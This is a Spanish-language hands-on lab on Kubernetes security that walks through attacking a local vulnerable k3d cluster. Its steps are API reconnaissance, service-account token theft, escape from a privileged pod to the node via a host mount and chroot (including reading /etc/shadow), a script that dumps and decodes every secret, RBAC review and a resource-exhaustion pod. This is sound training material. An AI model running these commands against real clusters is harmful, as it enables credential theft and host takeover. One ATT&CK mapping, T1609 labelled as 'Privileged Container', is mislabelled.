# Lab 04 — Kubernetes Security

## Objetivo

Identificar y explotar misconfiguraciones en clústeres Kubernetes: API server expuesto, pods privilegiados, escape de contenedor y robo de service account tokens.

---

## Setup del entorno

```bash
# Instalar k3d (cluster K8s en Docker, más ligero que minikube)
curl -s https://raw.githubusercontent.com/k3d-io/k3d/main/install.sh | bash

# Crear cluster vulnerable
k3d cluster create vuln-cluster \
    --api-port 6550 \
    --port "30080:80@loadbalancer" \
    --agents 1

# Verificar
kubectl get nodes
kubectl cluster-info

# Desplegar pods vulnerables del lab
kubectl apply -f lab04-kubernetes/resources/vulnerable-pods.yaml
```

---

## Parte 1 — Reconocimiento del clúster

```bash
# Información del cluster
kubectl cluster-info
kubectl version

# Listar namespaces
kubectl get namespaces

# Listar pods en todos los namespaces
kubectl get pods --all-namespaces

# Listar servicios expuestos
kubectl get services --all-namespaces

# Ver recursos del nodo
kubectl describe nodes

# API server — intentar acceso sin autenticación
curl -k https://localhost:6550/api/v1/namespaces
curl -k https://localhost:6550/api/v1/pods
```

### kube-hunter — scanner automático

```bash
# Instalar
pip3 install kube-hunter

# Scan pasivo desde fuera del cluster
kube-hunter --remote localhost

# Scan desde dentro de un pod
kube-hunter --pod
```

---

## Parte 2 — Robar Service Account Token

Cada pod tiene un service account token montado en:
`/var/run/secrets/kubernetes.io/serviceaccount/token`

```bash
# Obtener shell en un pod
kubectl exec -it $(kubectl get pod -o name | head -1) -- bash

# Desde dentro del pod, leer el token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

echo "Token: $TOKEN" | head -c 100

# Usar el token para consultar la API
curl -s --cacert $CA \
    -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/default/pods

# Si el service account tiene demasiados permisos:
curl -s --cacert $CA \
    -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/secrets
```

---

## Parte 3 — Pod Privilegiado (escape de contenedor)

Un pod con `privileged: true` y montaje del socket Docker o del sistema de archivos del host puede escapar al nodo:

```yaml
# vulnerable-pod-privileged.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: pwned
    image: alpine
    securityContext:
      privileged: true      # acceso total al nodo
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /               # monta el filesystem del nodo host
```

```bash
# Desplegar el pod
kubectl apply -f resources/vulnerable-pod-privileged.yaml

# Obtener shell
kubectl exec -it privileged-pod -- sh

# Desde dentro: acceder al filesystem del nodo
ls /host/etc/passwd
ls /host/root/
cat /host/etc/shadow

# Escape completo al host via chroot
chroot /host /bin/bash
whoami  # → root (en el nodo)
```

---

## Parte 4 — Robar secretos de Kubernetes

```bash
# Listar secretos del namespace default
kubectl get secrets

# Ver un secreto específico
kubectl get secret my-secret -o yaml

# Decodificar el valor (base64)
kubectl get secret my-secret -o jsonpath='{.data.password}' | base64 -d

# Con el token de un service account privilegiado:
curl -s --cacert $CA \
    -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/default/secrets \
    | python3 -c "
import sys,json,base64
data=json.load(sys.stdin)
for item in data['items']:
    name=item['metadata']['name']
    for k,v in item.get('data',{}).items():
        val=base64.b64decode(v).decode('utf-8','ignore')
        print(f'{name}.{k} = {val}')
"
```

---

## Parte 5 — RBAC Misconfigurations

```bash
# Ver permisos del service account actual
kubectl auth can-i --list

# Verificar permisos específicos
kubectl auth can-i get secrets
kubectl auth can-i create pods
kubectl auth can-i exec pods

# Listar ClusterRoleBindings (quién tiene permisos de cluster)
kubectl get clusterrolebindings -o wide

# Ver si hay service accounts con cluster-admin
kubectl get clusterrolebindings -o json \
    | python3 -c "
import sys,json
data=json.load(sys.stdin)
for item in data['items']:
    if 'cluster-admin' in item.get('roleRef',{}).get('name',''):
        subjects=item.get('subjects',[])
        for s in subjects:
            print(f\"cluster-admin → {s.get('kind')}: {s.get('name')}\")
"
```

---

## Parte 6 — Horizontal Pod Autoscaler & Resource Exhaustion

```bash
# Desplegar pod que consume todos los recursos (DoS interno)
kubectl run stress-pod --image=progrium/stress \
    -- --cpu 4 --vm 2 --vm-bytes 512M

# Ver impacto
kubectl top nodes
kubectl top pods
```

---

## Actividades

1. Crear el cluster k3d y desplegar los pods vulnerables
2. Robar el service account token de un pod y usarlo para listar pods via API
3. Desplegar el pod privilegiado y montar el filesystem del nodo host
4. Listar y decodificar todos los secretos del namespace `default`
5. Identificar service accounts con permisos excesivos usando `kubectl auth can-i --list`

---

## Mapeo MITRE ATT&CK Containers

| Técnica | TTP |
|---------|-----|
| Container Escape | T1611 |
| Deploy Container | T1610 |
| Steal Application Access Token | T1528 |
| Unsecured Credentials | T1552 |
| Privileged Container | T1609 |
